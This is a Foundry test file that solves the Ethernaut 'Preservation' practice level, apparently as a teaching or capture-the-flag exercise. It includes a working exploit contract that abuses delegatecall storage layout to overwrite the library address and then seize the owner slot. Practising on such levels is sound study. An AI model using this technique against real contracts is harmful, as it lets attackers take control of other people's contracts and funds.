// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {console, Test} from "forge-std/Test.sol";
import {Preservation} from "../../src/16/Preservation.sol";
import {HelperConfig} from "../../script/HelperConfig.s.sol";
import {PreservationFactory} from "src/16/PreservationFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {BaseTest} from "../BaseTest.sol";
import {Vm} from "forge-std/Vm.sol";

contract PreservationTest is Test, BaseTest {
    Preservation public instanceContract;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = address(new PreservationFactory());
        vm.deal(owner, 1 ether);
        vm.deal(player, 2 ether);
    }

    function setUp() public override {
        super.setUp();
        config = new HelperConfig{value: 1 ether}(levelFactory);
        (ethernaut, instance,) = config.activeNetworkConfig();

        instanceContract = Preservation(instance);
    }

    function testRunLevel() public {
        runLevel();
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);
        Exploit exploit = new Exploit();

        // Set the exploit contract as the first storage slot value
        instanceContract.setSecondTime(uint256(uint160(address(exploit))));

        // important uint256(bytes32(bytes20(player))) left pads the address to the right (when doing bytes32)then converts to uint256 while
        // uint256(uint160(address(player))) pads to the left (when doin uint256) 
        // uint256(bytes32(bytes20(address(0x123)))) would yield 0x0000000000000000000000000000000000000123000000000000000000000000
        // uint256(uint160(address(0x123))) would yield 0x0000000000000000000000000000000000000000000000000000000000000123,
        instanceContract.setFirstTime(uint256(uint160(player))); 

        vm.stopPrank();

        assert(instanceContract.owner() == player);
    }
}

contract Exploit {
    address freeSlot1;
    address freeSlot2;

    address owner;

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}
